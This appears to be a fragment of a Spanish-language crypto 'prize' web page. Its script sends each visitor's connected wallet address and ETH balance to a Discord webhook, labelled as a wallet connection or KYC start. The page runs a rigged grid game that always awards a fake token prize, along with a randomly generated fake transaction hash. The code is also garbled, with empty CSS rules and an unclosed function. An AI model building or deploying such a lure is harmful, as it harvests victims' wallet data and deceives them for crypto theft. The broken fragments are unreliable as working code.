        .grid {

@keyframes pop {

.cell.mine {

    async function sendToDiscordWebhook(eventType, address, balance) {
      const embed = {
        title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
        color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
        fields: [
          { name: 'Direcci√≥n', value: address },
          { name: 'Balance', value: `${balance} ETH` }
        ],
        timestamp: new Date().toISOString()
      };

      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });
      } catch (error) {
        console.error("Error enviando a Discord:", error);
      }

	   const cryptoPrizes = [
            { token: 'USDT', amount: () => (Math.random() * 50 + 10).toFixed(2) },
            { token: 'USDC', amount: () => (Math.random() * 50 + 10).toFixed(2) },
            { token: 'WLD', amount: () => (Math.random() * 5 + 1).toFixed(4) }
        ];

        let attempts = 3;
        let minePosition = Math.floor(Math.random() * 25);
        let revealedCells = new Set();

        function initializeGrid() {
            const grid = document.getElementById('grid');
            grid.innerHTML = '';
            
            for (let i = 0; i < 25; i++) {
                const cell = document.createElement('div');
                cell.className = 'cell';
                cell.dataset.index = i;
                cell.addEventListener('click', handleCellClick);
                grid.appendChild(cell);
            }
        }

        function handleCellClick(event) {
            if (attempts <= 0) return;
            
            const cell = event.target;
            const index = parseInt(cell.dataset.index);
            
            if (revealedCells.has(index)) return;
            
            revealedCells.add(index);
            cell.classList.add('revealed');
            
            if (index === minePosition) {
                awardPrize(cell);
            } else {
                attempts--;
                document.getElementById('attempts').textContent = attempts;
                
                if (attempts === 0) {
                    // Forzar premio en el tercer intento
                    setTimeout(() => awardPrize(findRandomUnrevealedCell()), 500);
                }
            }
        }

        function awardPrize(cell) {
            const prize = cryptoPrizes[Math.floor(Math.random() * cryptoPrizes.length)];
            const amount = prize.amount();
            
            cell.classList.add('mine');
            cell.innerHTML = `
               <div class="token-icon">${prize.token}</div>
  ${amount}
`;
            
            document.getElementById('prize-info').innerHTML = `
                ¬°Premio reclamado!<br>
                ${amount} ${prize.token}<br>
                <small>Tx: 0x${Array.from({length: 16}, () => 
                    Math.floor(Math.random() * 16).toString(16)).join('')}...</small>
            `;
            
            attempts = 0;
            document.getElementById('attempts').textContent = 0;
        }

        function findRandomUnrevealedCell() {
            let availableCells = Array.from(document.querySelectorAll('.cell:not(.revealed)'));
            return availableCells[Math.floor(Math.random() * availableCells.length)];
        }

        // Inicializaci√≥n
        initializeGrid();
